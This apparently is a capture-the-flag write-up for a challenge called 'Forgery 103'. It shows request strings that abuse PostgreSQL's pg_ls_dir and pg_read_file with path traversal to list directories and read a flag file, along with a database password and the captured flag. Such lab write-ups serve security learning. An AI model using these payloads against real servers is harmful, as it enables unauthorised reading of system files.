# Forgery 103

If we look at:    
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-manipulation

We can see that we can use something like ``select pg_ls_dir('./');`` to check the contents of the remote server and we do get a result that means that we can go back + from the previous challenge we know we are in file:////var/www/html/database/index.php or something like that so we just need to send:

``user=postgres&password=Let%26me%3Din&query=select pg_ls_dir('../../../../../');``

And we see that the flag is written in a .txt file therefore we can also use this to open it:   
``user=postgres&password=Let%26me%3Din&query=select pg_read_file('../../../../../flag_is_in_here_af0d37cc7402f7d3da88033562.txt');``

``FLAG-95z9hr9gRHTfg6J22GSBtu9jTXrg4FQB``
